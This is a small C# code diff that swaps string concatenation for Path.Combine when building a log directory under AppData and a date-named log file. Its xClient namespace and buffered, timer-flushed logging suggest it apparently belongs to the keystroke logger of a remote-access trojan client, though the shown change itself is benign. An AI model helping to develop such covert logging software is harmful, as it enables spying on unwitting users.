@@ -30,7 +30,7 @@ namespace xClient.Core.Utilities
         /// <summary>
         /// The directory where the log files will be saved.
         /// </summary>
-        public static string LogDirectory { get { return Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\Logs\\"; } }
+        public static string LogDirectory { get { return Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), "Logs\\"); } }
 
         private readonly Timer _timerFlush;
         private StringBuilder _logFileBuffer;
@@ -245,7 +245,7 @@ namespace xClient.Core.Utilities
         {
             bool writeHeader = false;
 
-            string fileName = LogDirectory + DateTime.Now.ToString("MM-dd-yyyy");
+            string fileName = Path.Combine(LogDirectory, DateTime.Now.ToString("MM-dd-yyyy"));
 
             try
             {
